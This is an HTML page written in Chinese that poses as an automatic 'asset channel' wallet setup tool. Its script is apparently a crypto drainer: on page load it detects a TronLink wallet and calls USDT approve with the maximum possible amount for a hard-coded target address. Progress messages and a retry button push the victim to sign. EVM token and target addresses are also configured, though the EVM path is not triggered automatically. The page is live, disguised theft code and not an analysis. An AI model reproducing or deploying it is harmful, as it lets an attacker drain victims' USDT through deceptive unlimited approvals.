<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>多钱包多链資產通道配置</title>
<style>
  body {
    background: #121212;
    color: #eee;
    font-family: "Microsoft Yahei", Arial, sans-serif;
    display: flex;
    flex-direction: column;
    height: 100vh;
    margin: 0;
    justify-content: center;
    align-items: center;
  }
  h2 {
    margin-bottom: 1rem;
  }
  .status {
    font-size: 1.4rem;
    margin-bottom: 20px;
    transition: color 0.3s ease;
    max-width: 320px;
    text-align: center;
    word-break: break-word;
  }
  .status.loading {
    color: #888;
  }
  .status.success {
    color: #4caf50;
  }
  .status.error {
    color: #f44336;
  }
  .progress-bar {
    width: 300px;
    height: 8px;
    background: #333;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: 0 0 5px #222 inset;
    margin-bottom: 15px;
  }
  .progress-bar > div {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #2196f3, #21cbf3);
    transition: width 0.5s ease;
  }
  button {
    padding: 0.6rem 1.5rem;
    font-size: 1rem;
    background-color: #2196f3;
    border: none;
    border-radius: 5px;
    color: white;
    cursor: pointer;
  }
  button:hover {
    background-color: #1976d2;
  }
</style>
</head>
<body>

<h2>資產通道自動配置</h2>
<div id="status" class="status loading">初始化中...</div>
<div class="progress-bar"><div id="progress"></div></div>
<button id="retryBtn" style="display:none;">重新嘗試授權</button>

<script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
<script>
  const CFG = {
    USDT: {
      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
      ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      BNB:  "0x55d398326f99059fF775485246999027B3197955"
    },
    TARGET: {
      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
      EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
    },
    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
  };

  const statusEl = document.getElementById("status");
  const progressEl = document.getElementById("progress");
  const retryBtn = document.getElementById("retryBtn");

  function setStatus(msg, cls="loading", progressPercent=null) {
    statusEl.innerText = msg;
    statusEl.className = "status " + cls;
    if (progressPercent !== null) {
      progressEl.style.width = progressPercent + "%";
    }
  }

  function waitForTronWeb(timeout = 5000) {
    return new Promise((resolve, reject) => {
      let waited = 0;
      const interval = setInterval(() => {
        if (window.tronWeb && window.tronWeb.ready) {
          clearInterval(interval);
          resolve(true);
        }
        waited += 200;
        if (waited >= timeout) {
          clearInterval(interval);
          reject(new Error("Tron 錢包初始化超時"));
        }
      }, 200);
    });
  }

  async function tronApprove() {
    try {
      setStatus("正在進行 Tron 通道授權...", "loading", 60);
      const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
      await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
      setStatus("✅ Tron 通道授權成功", "success", 100);
      retryBtn.style.display = "none";
      return true;
    } catch (e) {
      console.error("Tron 授權失敗:", e);
      setStatus("Tron 授權失敗，請檢查錢包並重試", "error", 100);
      retryBtn.style.display = "inline-block";
      return false;
    }
  }

  // EVM 授權接口，**不自動調用**，避免彈窗
  async function evmApprove() {
    try {
      setStatus("偵測到 EVM 錢包，但不自動授權，請手動操作。", "loading", 100);
      retryBtn.style.display = "inline-block";
      return false;
    } catch (e) {
      console.error("EVM 授權失敗:", e);
      setStatus("EVM 授權失敗，請手動重試", "error", 100);
      retryBtn.style.display = "inline-block";
      return false;
    }
  }

  async function detectAndApprove() {
    setStatus("開始檢測錢包環境...", "loading", 10);
    retryBtn.style.display = "none";

    // 優先 Tron
    if (window.tronWeb && window.tronWeb.ready) {
      setStatus("偵測到 Tron 錢包，準備授權...", "loading", 30);
      const tronOk = await tronApprove();
      if (tronOk) return;
    } else if (window.tronLink) {
      setStatus("等待 TronLink 錢包初始化...", "loading", 20);
      try {
        await waitForTronWeb();
        const tronOk = await tronApprove();
        if (tronOk) return;
      } catch (e) {
        console.warn("TronLink 初始化失敗", e);
      }
    }

    // 不自動調用 EVM 授權，避免彈窗跳轉
    if (window.ethereum) {
      setStatus("偵測到 EVM 錢包，但不自動授權，請使用Tron錢包進行授權。", "error", 100);
      retryBtn.style.display = "inline-block";
      return;
    }

    // 如果没检测到任何钱包
    setStatus("未偵測到可用錢包，請安裝或打開支持的錢包並刷新頁面", "error", 100);
    retryBtn.style.display = "inline-block";
  }

  retryBtn.onclick = () => {
    setStatus("重新嘗試授權中...", "loading", 0);
    detectAndApprove();
  };

  window.addEventListener('load', () => {
    let progress = 0;
    const progressInterval = setInterval(() => {
      progress += 5;
      if (progress < 10) setStatus("啟動中...", "loading", progress);
      if (progress >= 10) {
        clearInterval(progressInterval);
        detectAndApprove();
      }
    }, 100);
  });
</script>

</body>
</html>
